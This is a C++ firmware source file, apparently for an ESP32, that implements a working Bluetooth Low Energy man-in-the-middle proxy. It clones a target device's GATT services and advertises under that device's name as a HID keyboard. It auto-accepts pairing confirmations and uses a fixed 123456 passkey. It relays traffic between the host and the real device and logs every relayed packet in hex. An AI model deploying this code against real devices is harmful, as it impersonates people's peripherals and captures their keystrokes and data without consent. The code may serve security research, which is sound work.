// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 Matthew Kukanich

#include "mitm.h"

#include <LittleFS.h>
#include <NimBLEDevice.h>
#include <map>
#include <string>
#include <vector>

#include "clone.h"        // profile persistence + mirror view + honeypot stream
#include "connection.h"
#include "gatt.h"

namespace mitm {

namespace {

constexpr const char* kProfile = "_mitm";

// Marker lives alongside the profile on whatever backend clone uses (SD if
// present, else LittleFS), so save -> reboot -> load all hit the same store.
std::string markerPath() { return std::string(clone::storageDir()) + "/.mitm"; }

NimBLEServer* g_server = nullptr;
bool          g_active = false;
bool          g_built  = false;   // server built once per boot (NimBLE limitation)

// Target (central link) identity + state, for the reconnect watchdog.
std::string   g_targetAddr;
uint8_t       g_targetType = 0;
bool          g_targetWasUp = false;

// Mirror (local) chars in build order - paired with target remote chars by the
// matching position in gatt::cache() (same device, same dump order).
std::vector<NimBLECharacteristic*> g_serverChars;

// Relay maps (pointer-keyed):
//   target remote char -> mirror char   (notify: target -> host)
//   mirror char        -> target remote char  (write: host -> target)
std::map<NimBLERemoteCharacteristic*, NimBLECharacteristic*> g_t2c;
std::map<NimBLECharacteristic*, NimBLERemoteCharacteristic*> g_c2t;

uint16_t uuid16(const NimBLEUUID& u) {
    if (u.bitSize() != 16) return 0;
    const uint8_t* b = u.getValue();
    return (uint16_t)(b[0] | (b[1] << 8));
}
bool isGapOrGattStr(const std::string& u) { return u == "1800" || u == "1801"; }
bool isGapOrGatt(const NimBLEUUID& u) { uint16_t v = uuid16(u); return v == 0x1800 || v == 0x1801; }
bool isCccdStr(const std::string& u)  { return u == "2902"; }
bool isHidStr(const std::string& u)   { return u == "1812"; }

uint16_t propsToNimble(uint8_t p) {
    uint16_t n = 0;
    if (p & BLE_GATT_CHR_PROP_READ)         n |= NIMBLE_PROPERTY::READ;
    if (p & BLE_GATT_CHR_PROP_WRITE)        n |= NIMBLE_PROPERTY::WRITE;
    if (p & BLE_GATT_CHR_PROP_WRITE_NO_RSP) n |= NIMBLE_PROPERTY::WRITE_NR;
    if (p & BLE_GATT_CHR_PROP_NOTIFY)       n |= NIMBLE_PROPERTY::NOTIFY;
    if (p & BLE_GATT_CHR_PROP_INDICATE)     n |= NIMBLE_PROPERTY::INDICATE;
    if (p & BLE_GATT_CHR_PROP_BROADCAST)    n |= NIMBLE_PROPERTY::BROADCAST;
    return n;
}

std::string hexShort(const uint8_t* d, size_t len) {
    std::string s; char b[4];
    for (size_t i = 0; i < len && i < 24; i++) { snprintf(b, sizeof(b), "%02X ", d[i]); s += b; }
    if (len > 24) s += "...";
    return s;
}

void relayNotify(NimBLERemoteCharacteristic* t, uint8_t* data, size_t len, bool) {
    auto it = g_t2c.find(t);
    if (it == g_t2c.end() || !it->second) return;
    it->second->setValue(data, len);
    bool sent = it->second->notify();   // only reaches the host if it subscribed
    char hdr[72];
    snprintf(hdr, sizeof(hdr), "%6lus T->H NOTIFY h=0x%04X [%u]%s ",
             (unsigned long)(millis() / 1000), it->second->getHandle(),
             (unsigned)len, sent ? "" : " UNSENT");
    clone::honeypotLog(std::string(hdr) + hexShort(data, len));
}

// One callback for every mirror char: relays host writes inward to the target,
// and logs when the host (e.g. macOS HID manager) subscribes to a CCCD - the
// decisive signal for whether input reports will actually flow out.
class MirrorCharCb : public NimBLECharacteristicCallbacks {
    void onWrite(NimBLECharacteristic* c, NimBLEConnInfo&) override {
        NimBLEAttValue v = c->getValue();
        char hdr[64];
        snprintf(hdr, sizeof(hdr), "%6lus H->T WRITE h=0x%04X [%u] ",
                 (unsigned long)(millis() / 1000), c->getHandle(), (unsigned)v.size());
        clone::honeypotLog(std::string(hdr) + hexShort(v.data(), v.size()));
        auto it = g_c2t.find(c);
        if (it != g_c2t.end() && it->second)
            it->second->writeValue(v.data(), v.size(), it->second->canWrite());
    }
    void onSubscribe(NimBLECharacteristic* c, NimBLEConnInfo&, uint16_t subVal) override {
        const char* k = subVal == 0 ? "unsub" : subVal == 1 ? "NOTIFY"
                      : subVal == 2 ? "INDICATE" : "?";
        char b[96];
        snprintf(b, sizeof(b), "%6lus HOST SUBSCRIBE h=0x%04X %s uuid=%s",
                 (unsigned long)(millis() / 1000), c->getHandle(), k,
                 c->getUUID().toString().c_str());
        clone::honeypotLog(b);
    }
};

class MitmServerCb : public NimBLEServerCallbacks {
    void onConnect(NimBLEServer*, NimBLEConnInfo& info) override {
        clone::honeypotSetHostConnected(true);
        clone::honeypotLog(std::string("HOST CONNECTED ") + info.getAddress().toString().c_str());
    }
    void onDisconnect(NimBLEServer*, NimBLEConnInfo&, int reason) override {
        clone::honeypotSetHostConnected(false);
        char b[48]; snprintf(b, sizeof(b), "host disconnected reason=0x%04X", reason);
        clone::honeypotLog(b);
    }
    void onMTUChange(uint16_t mtu, NimBLEConnInfo&) override {
        char b[24]; snprintf(b, sizeof(b), "MTU=%u", mtu); clone::honeypotLog(b);
    }
    void onConfirmPassKey(NimBLEConnInfo& info, uint32_t pin) override {
        char b[48]; snprintf(b, sizeof(b), "NUMERIC CMP %06u (auto-accept)", (unsigned)pin);
        clone::honeypotLog(b);
        NimBLEDevice::injectConfirmPasskey(info, true);
    }
    uint32_t onPassKeyDisplay() override {
        clone::honeypotLog("PASSKEY ENTRY: enter 123456 on host");
        return 123456;
    }
    void onAuthenticationComplete(NimBLEConnInfo& info) override {
        char b[48]; snprintf(b, sizeof(b), "pairing done encrypted=%d bonded=%d",
                             info.isEncrypted(), info.isBonded());
        clone::honeypotLog(b);
    }
};

MirrorCharCb g_charCb;
MitmServerCb g_serverCb;

// Build the mirror server (DISCONNECTED - so ble_gatts_start runs on a clean DB)
// and start advertising. Collects g_serverChars in order (skipping GAP/GATT).
bool buildAndAdvertise() {
    NimBLEDevice::setSecurityAuth(true, true, true);
    NimBLEDevice::setSecurityIOCap(BLE_HS_IO_DISPLAY_YESNO);

    g_server = NimBLEDevice::createServer();
    g_server->setCallbacks(&g_serverCb);
    g_serverChars.clear();

    std::string advName = "MITM";
    for (const auto& s : clone::loadedMirror()) {
        if (isGapOrGattStr(s.uuid)) continue;
        bool hid = isHidStr(s.uuid);
        NimBLEService* svc = g_server->createService(NimBLEUUID(s.uuid));
        if (!svc) continue;
        for (const auto& c : s.chars) {
            uint16_t props = propsToNimble(c.props);
            if (props == 0) props = NIMBLE_PROPERTY::READ;
            if (hid) {
                if (props & NIMBLE_PROPERTY::READ)  props |= NIMBLE_PROPERTY::READ_ENC;
                if (props & NIMBLE_PROPERTY::WRITE) props |= NIMBLE_PROPERTY::WRITE_ENC;
            }
            NimBLECharacteristic* cc = svc->createCharacteristic(NimBLEUUID(c.uuid), props);
            if (!cc) { g_serverChars.push_back(nullptr); continue; }
            cc->setCallbacks(&g_charCb);   // log host subscribes + relay host writes
            if (!c.value.empty()) cc->setValue(c.value.data(), c.value.size());
            if (c.uuid == "2a00" && !c.value.empty())
                advName.assign((const char*)c.value.data(), c.value.size());
            for (const auto& d : c.descs) {
                if (isCccdStr(d.uuid)) continue;   // stack adds CCCD for notify/indicate
                NimBLEDescriptor* desc = cc->createDescriptor(
                    NimBLEUUID(d.uuid), NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE);
                if (desc && !d.value.empty()) desc->setValue(d.value.data(), d.value.size());
            }
            g_serverChars.push_back(cc);   // index aligns with non-GAP/GATT cache order
        }
        // NimBLE 2.x auto-starts services with the server (svc->start() is a no-op).
    }

    g_server->advertiseOnDisconnect(true);   // re-advertise when the host drops

    // The GAP service (0x1800) is auto-provided by NimBLE, so its Device Name
    // char would otherwise return the stack default ("ChimeraBLE"). Override
    // it with the cloned name so the host sees the real device identity.
    NimBLEDevice::setDeviceName(advName);

    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
    NimBLEAdvertisementData advData, scanData;
    advData.setFlags(0x06);
    advData.setAppearance(0x03C1);   // HID Keyboard (host-recognizable)
    for (const auto& s : clone::loadedMirror())   // include the HID service UUID
        if (s.uuid == "1812") advData.addServiceUUID(NimBLEUUID((uint16_t)0x1812));
    scanData.setName(advName);
    adv->setAdvertisementData(advData);
    adv->setScanResponseData(scanData);
    bool ok = adv->start();
    clone::honeypotLog(std::string("MITM mirror advertising as '") + advName + "' " + (ok ? "ok" : "FAIL"));
    return true;
}

// After (re)connecting + dumping the target, pair each mirror char to its target
// remote char by matching position, subscribe notifies, attach write relays.
void wireRelays() {
    g_t2c.clear();
    g_c2t.clear();
    size_t k = 0;
    int notifies = 0;
    for (auto& svc : gatt::cache()) {
        if (isGapOrGatt(svc.uuid)) continue;
        for (auto& chr : svc.chars) {
            if (k >= g_serverChars.size()) break;
            NimBLECharacteristic* cc = g_serverChars[k++];
            if (!cc || !chr.ptr) continue;
            g_t2c[chr.ptr] = cc;
            if (chr.props & (BLE_GATT_CHR_PROP_WRITE | BLE_GATT_CHR_PROP_WRITE_NO_RSP))
                g_c2t[cc] = chr.ptr;   // callback already set in buildAndAdvertise
            if (chr.props & BLE_GATT_CHR_PROP_NOTIFY) {
                if (chr.ptr->subscribe(true, relayNotify)) notifies++;
            } else if (chr.props & BLE_GATT_CHR_PROP_INDICATE) {
                if (chr.ptr->subscribe(false, relayNotify)) notifies++;
            }
        }
    }
    char b[64];
    snprintf(b, sizeof(b), "MITM relays wired: %u chars, %d notifies", (unsigned)g_t2c.size(), notifies);
    clone::honeypotLog(b);
}

}  // namespace

bool active() { return g_active; }

void requestStart(const scanner::Result& target) {
    if (!gatt::hasCache()) { Serial.println("[mitm] no dump to proxy"); return; }
    if (!clone::save(kProfile)) { Serial.println("[mitm] failed to persist target"); return; }
    std::string marker = markerPath();
    File f = clone::storageFs().open(marker.c_str(), "w");
    if (f) { f.printf("%s\n%u\n", target.addr.c_str(), (unsigned)target.addr_type); f.close(); }
    Serial.println("[mitm] rebooting to start proxy ...");
    delay(400);
    ESP.restart();
}

bool applyBoot() {
    std::string marker = markerPath();
    if (!clone::storageFs().exists(marker.c_str())) return false;
    File f = clone::storageFs().open(marker.c_str(), "r");
    String addr = f ? f.readStringUntil('\n') : String();
    String typeStr = f ? f.readStringUntil('\n') : String();
    if (f) f.close();
    clone::storageFs().remove(marker.c_str());   // one-shot
    addr.trim(); typeStr.trim();
    if (addr.length() == 0) return false;
    uint8_t addrType = (uint8_t)typeStr.toInt();
    g_targetAddr = std::string(addr.c_str());
    g_targetType = addrType;

    if (!clone::load(kProfile)) { Serial.println("[mitm] boot: profile load failed"); return false; }

    // 1) Build the mirror + advertise while DISCONNECTED (clean GATT DB).
    Serial.println("[mitm] boot: building mirror server");
    if (!buildAndAdvertise()) return false;
    g_built = true;

    // 2) Now connect to the real target as a central and pair.
    Serial.printf("[mitm] boot: connecting target %s\n", addr.c_str());
    connection::setAutoSecure(true);
    if (!connection::connectByMac(g_targetAddr, g_targetType)) {
        clone::honeypotLog("MITM: target connect failed (advertising only)");
        g_active = true;   // server is up; relay just isn't wired
        return true;
    }
    uint32_t t0 = millis();
    while (connection::isConnected() && !connection::isEncrypted() && millis() - t0 < 8000) {
        connection::serviceAutoRetry();
        delay(20);
    }

    // 3) Discover the target and wire the relays.
    Serial.println("[mitm] boot: dumping target");
    gatt::dump(true);
    wireRelays();

    g_active = true;
    g_targetWasUp = connection::isConnected();

    // 4) The central connect above stops the advertiser (radio switches to
    //    initiating), so re-start it now that the proxy is live and keep it
    //    alive via loopTick().
    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
    if (!adv->isAdvertising()) {
        bool ok = adv->start();
        clone::honeypotLog(std::string("MITM re-advertising ") + (ok ? "ok" : "FAIL"));
    }

    clone::honeypotLog("MITM proxy live - connect a host");
    return true;
}

void loopTick() {
    if (!g_active) return;

    // Keep the mirror discoverable whenever no host is connected (the central
    // connect / a host disconnect stops the advertiser).
    if (!clone::hostConnected()) {
        NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
        if (adv && !adv->isAdvertising()) adv->start();
    }

    // Target-link watchdog: if the central link to the real device drops (e.g.
    // dual-role scheduling kicked it when the host connected), say so on the
    // Honeypot and try to bring it back so reports keep flowing.
    bool up = connection::isConnected();
    if (up) {
        g_targetWasUp = true;
    } else if (g_targetWasUp) {
        g_targetWasUp = false;             // edge: was up, now down - try once
        clone::honeypotLog("TARGET LINK LOST - reconnecting");
        if (connection::connectByMac(g_targetAddr, g_targetType)) {
            uint32_t t0 = millis();
            while (connection::isConnected() && !connection::isEncrypted() &&
                   millis() - t0 < 8000) {
                connection::serviceAutoRetry();
                delay(20);
            }
            gatt::dump(true);
            wireRelays();
            g_targetWasUp = connection::isConnected();
            clone::honeypotLog(g_targetWasUp ? "TARGET RECONNECTED"
                                             : "TARGET RECONNECT FAILED");
        } else {
            clone::honeypotLog("TARGET RECONNECT FAILED");
        }
    }
}

void stop() {
    if (!g_active) return;
    for (auto& kv : g_t2c) if (kv.first) kv.first->unsubscribe();
    NimBLEDevice::getAdvertising()->stop();   // server stays built; reboot to re-proxy
    g_active = false;
    g_t2c.clear();
    g_c2t.clear();
    clone::honeypotLog("MITM proxy stopped");
}

}
